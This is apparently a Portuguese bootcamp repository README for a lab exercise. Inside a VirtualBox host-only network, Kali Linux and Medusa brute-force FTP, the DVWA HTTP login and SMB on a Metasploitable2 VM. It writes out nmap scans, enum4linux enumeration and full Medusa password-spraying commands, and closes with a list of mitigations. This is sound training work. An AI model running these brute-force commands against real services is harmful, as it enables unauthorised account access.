# ProjetoSimuladoBootcampMedusaeKaliLinux
Repositório criado para entrega de projeto sobre vulnerabilidades exploráveis com medusa e kali linux

Utilizar Kali Linux e a ferramenta Medusa, explorando serviços vulneráveis como FTP, Http e SMB, e documentar recomendações de mitigação.

# Configuração do Ambiente
VirtualBox com duas VMs:
Kali Linux
Metasploitable2
Rede interna (Host-only)
IPs utilizados:

Kali Linux → 192.168.0.128

Metasploitable 2 → 192.168.0.129

# Atividades
0. Criação de wordlists e passlist

echo -e "user\nmsfadmin\nadmin\nroot\nnuvem71\npedra24\nrio88\nfolha13\nvento56\nsol42\" > users.txt

echo -e "123456\npassword\nqwerty\nmsfadmin\nchuva17\nbosque52\npraia46\ncampo95\nneblina28\noceano73" > pass.txt

1. FTP – Força Bruta

Varrer a rede com nmap

nmap -sS -sV -O 192.168.0.0/24

Verificação de portas mais vulneraveis com Nmap

nmap -sV -p 21,22,80,445,139 192.168.0.129

medusa -h 192.168.0.129 -U users.txt -P pass.txt -M ftp -t 8

2. HTTP com metadados

medusa -h 192.168.0.129 -U users.txt -P pass.txt -M http -m PAGE:'dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 8

3. SMB com Password Spraying

Enumeração de usuários enum4linux -a 192.168.0.129 | tee enum4_output.txt less enum4_output.txt

>Como nmsfadmin já existia na criação anterior

medusa -h 192.168.0.129 -U users.txt -P pass.txt -M smbnt -t 4 -T 50

# Mitigação

Customização de mensagens retornadas pelas aplicações para não revelarem resultado da consulta(Não retornar "senha errada", "usuário não cadastrado")

Uso de senhas fortes e políticas de complexidade.

Uso de duplo fator de autenticação.

Implementação de bloqueio de conta após falhas consecutivas.

Monitoramento de logs e alertas de segurança.

Segmentação e restrição de serviços vulneráveis.
